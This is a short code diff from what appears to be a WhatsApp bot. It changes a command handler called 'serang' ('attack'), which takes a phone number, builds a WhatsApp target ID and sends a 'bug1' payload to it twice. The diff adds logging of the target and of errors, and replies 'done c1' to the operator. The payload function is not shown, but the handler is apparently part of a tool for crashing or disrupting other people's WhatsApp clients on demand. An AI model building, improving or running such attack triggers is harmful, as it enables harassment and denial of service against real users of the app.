@@ -727,15 +727,19 @@ if (body.trim().toLowerCase().startsWith("serang")) {
   if (!args[0]) return;
 
   const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+  console.log("[serang] target:", target);
 
   try {
     await bug1(sock, target);
     await bug1(sock, target);
-  } catch (e) {}
+    console.log("[serang] bug terkirim");
+  } catch (e) {
+    console.log("[serang] error:", e?.message || e);
+  }
 
   await sock.sendMessage(from, {
     text: "done c1"
-  });
+  }, { quoted: mek });
   return;
 }
     // ===== END TRIGGER =====
